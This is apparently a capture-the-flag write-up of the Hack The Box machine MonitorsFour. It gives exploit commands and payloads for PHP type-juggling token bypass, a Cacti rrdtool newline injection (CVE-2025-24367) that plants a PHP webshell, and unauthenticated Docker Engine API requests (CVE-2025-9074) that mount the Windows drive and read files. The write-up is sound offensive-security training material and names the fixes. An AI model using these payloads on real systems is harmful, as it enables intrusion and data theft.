# MonitorsFour — Hack The Box, Easy, Windows

**TL;DR:** A box that can never call home. A PHP `==` comparison lets `token=0`
match every `0e…` token and dump the user table; the admin's unsalted MD5 cracks
and is reused on a Cacti 1.2.28 instance found by subdomain fuzzing, whose login
form is also a username oracle. CVE-2025-24367 — `cacti_escapeshellarg()` never
strips newlines — breaks the `rrdtool` command across lines and writes a PHP
webshell into the web root. The web container then reaches the Docker Desktop
engine API unauthenticated (CVE-2025-9074), mounts the Windows `C:` drive, and
reads the flag back through the logs endpoint. Every winning step is inbound.

> Two ports, five weaknesses, and not a single one of them a callback.

*Flags redacted. Machine address generalised to `10.129.x.x`.*

---

## The shape of the problem

Two ports, and a firewall that says a lot by what it hides.

```
$ nmap -Pn -sS -p- --min-rate 2000 10.129.x.x
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
```

Everything else comes back **filtered**, not closed — a host firewall dropping
packets silently. TTL 127 says Windows. WinRM's NTLM challenge, asked politely
with a type-1 token, hands back the machine's own name before any credential:
`MONITORSFOUR`, NetBIOS domain equal to the computer name, so this is a
standalone box, not domain-joined. Port 80 is the way in; 5985 is the exit we
haven't earned yet.

A detail that will matter for the whole engagement, established early and the
hard way: **this box cannot make new outbound connections.** Return traffic to
our own requests flows fine, but a reverse shell, an SNMP callback, an ICMP
ping outward — all silently dropped. Everything that follows has to work
*inbound*: we drive the box, we don't ask it to call us.

## Phase 1: authentication that can't tell 0 from "0e…"

The site redirects the raw IP to `monitorsfour.htb` (vhost gating — add it to
hosts). It's a bespoke PHP app with a login and a "forgot password". Directory
brute force turns up `/user` and `/contact`; `/contact` is the gift, throwing a
raw PHP warning that leaks the app's layout:

```
include(/var/www/app/views/contact.php): Failed to open stream …
in /var/www/app/Router.php on line 110
```

`/user` and `/api/v1/users` both want a `token`. Fuzzing the token parameter
with a character set, one value stands out — not a letter, but **`0`**:

```
$ curl 'http://monitorsfour.htb/api/v1/users?token=0'
[{"id":2,"username":"admin",...,"password":"56b32eb43e6f15395f6c46c1c9e1cd36",
  "token":"8024b78f83f102da4f",...},
 {"username":"mwatson",...,"token":"0e543210987654321",...},
 {"username":"janderson",...,"token":"0e999999999999999",...},
 {"username":"dthompson",...,"token":"0e111111111111111",...}]
```

The whole user table. The bug is PHP **type juggling**: the validator compares
the supplied token to each stored token with `==`. Three tokens have the shape
`0e<digits>`, which PHP reads as scientific notation — `0.0`. Against the string
`"0"`, also `0.0`, `0 == 0` is true. Loose comparison turned "know a token" into
"send a zero". The fix is `===` (or `hash_equals`), which compares type and
bytes both.

The `password` fields are unsalted MD5. `admin`'s cracks instantly:
`56b32eb43e6f15395f6c46c1c9e1cd36` → **`wonderful1`**. It doesn't work on the
main-app login form directly for admin's session, but it authenticates the admin
panel, and — more usefully — it's a *reused* password.

## Phase 2: a monitoring box named after monitoring

Subdomain fuzzing finds `cacti.monitorsfour.htb` — an instance of **Cacti
1.2.28** (pinned from the login footer and confirmed against `/cacti/CHANGELOG`).
`admin:wonderful1` is refused by Cacti. But the Cacti login screen leaks which
usernames exist: an invalid user yields `Access Denied! Login Failed.` (capital
F, two spaces) and a fast response; a *valid* user yields `Login failed.`
(lowercase, one space) and a slower one, because it actually computed a hash.
Sweeping the obvious names, `admin` and **`marcus`** come back valid — and Marcus
Higgins is the admin whose password we cracked. `marcus:wonderful1` lands us in
Cacti with graph and template rights.

## Phase 3: teaching rrdtool to write PHP (CVE-2025-24367)

Cacti renders graphs by shelling out to `rrdtool`. To quote arguments safely
across platforms it rolls its own `cacti_escapeshellarg()` — which wraps the
value and escapes quotes, but **never strips newlines**. The graph command is
assembled as one logical line spread across many physical ones with `\`-newline
continuations:

```
rrdtool graph out.png \
--right-axis-label 'whatever the user typed' \
--vertical-label 'something' \
...
```

Slip a newline into *Right Axis Label* and the continuation breaks: the text
after the newline stops being an argument and becomes the next line of the
command stream, which rrdtool reads as a fresh subcommand. rrdtool's `graph`
subcommand can write a CSV to an arbitrary path, and the CSV contains each
element's label verbatim — so a `LINE1:out:<?=…?>` label writes PHP. Setting the
field to:

```
X
create pocdf.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200
graph df9x.php -s now -a CSV DEF:out=pocdf.rrd:temp:AVERAGE LINE1:out:<?=system(array_values($_REQUEST)[0]);?>
```

(quotes avoided entirely — `array_values($_REQUEST)[0]` grabs the first request
value without needing them), saving the template, and previewing the graph makes
rrdtool write `df9x.php` into its working directory — the Cacti web root:

```
$ curl 'http://cacti.monitorsfour.htb/cacti/df9x.php?0=id'
"time","uid=33(www-data) gid=33(www-data) groups=33(www-data) ..."
```

Code execution as `www-data` — and crucially it's a **webshell**, reached
inbound, so the egress block is irrelevant. Fixed in Cacti 1.2.29 with a single
`str_replace` stripping `\n`/`\r` at the top of `cacti_escapeshellarg()`.

The container's hostname is `821fbd6a43fa` with a `172.18.0.0/16` address — a
Docker container. `user.txt` sits world-readable in `/home/marcus/`.

## Phase 4: the container that owns the host (CVE-2025-9074)

The stack runs under **Docker Desktop on a WSL2 backend** (the changelog even
bragged about it). Docker Desktop has a flaw, CVE-2025-9074, where a container
can reach the Docker Engine API on the internal subnet with no authentication:

```
$ curl http://192.168.65.7:2375/version
{"Version":"28.3.2","Os":"linux","KernelVersion":"6.6.87.2-microsoft-standard-WSL2",...}
```

Full unauthenticated control of the engine. On the Windows/WSL2 backend that
includes **mounting the host's drive**. We ask the API to create a container that
binds `/mnt/host/c` (the Windows `C:`) to `/host_root` and reads the flag — and
since we can't catch a reverse shell, we read the container's **stdout through the
logs API**, entirely inbound:

```
POST /containers/create  {"Image":"docker_setup-nginx-php:latest",
  "Cmd":["/bin/sh","-c","cat /host_root/Users/Administrator/Desktop/root.txt"],
  "Tty":true,"HostConfig":{"Binds":["/mnt/host/c:/host_root"]}}
POST /containers/<id>/start
GET  /containers/<id>/logs?stdout=1     → <root flag>
```

`root.txt` from the Administrator's desktop. The web container's blast radius is
the whole Windows host.

## The wall, and what it taught

The instructive part of this box is the long detour it invites. Cacti 1.2.28 has
a headline CVE — **CVE-2025-22604**, SNMP-parser RCE — and the natural move is to
point a Cacti device at a rogue SNMP agent you control and let its poller query
you into command execution. On an egress-filtered box that path is a trap: the
delivery requires the box to reach *out* to your agent, and it can't. Hours can
disappear proving, rigorously, that no packet ever leaves — pointing the device
at yourself, setting availability to None, watching a full poller cycle with a
packet capture, and getting nothing, because the firewall blocks new outbound and
the poller never runs anyway.

The lesson is one this methodology already preaches and this box enforces: on a
box that can't call home, **rank primitives by whether they're inbound or
pull-based before you invest in one.** The type-juggling dump, the webshell that
lands in the web root, the Docker API's logs endpoint — every winning step here
returns its result synchronously to a request we make. The SNMP callback and the
reverse shell, the two most reflexive moves in the playbook, are exactly the two
that were never going to work. Egress filtering doesn't make a box unsolvable; it
makes it a filter on *your* technique selection.

## Chain, end to end

```
type-juggling token=0  → dump users + hashes
crack admin MD5        → wonderful1
Cacti username oracle  → marcus valid
marcus:wonderful1      → Cacti 1.2.28 (password reuse)
CVE-2025-24367         → rrdtool newline injection → webshell (www-data, container)
                         user.txt
Docker Engine API      → CVE-2025-9074, unauth from container
mount C: → logs API    → root.txt (Windows host)
```

Two ports, five weaknesses, and not a single one of them a callback.
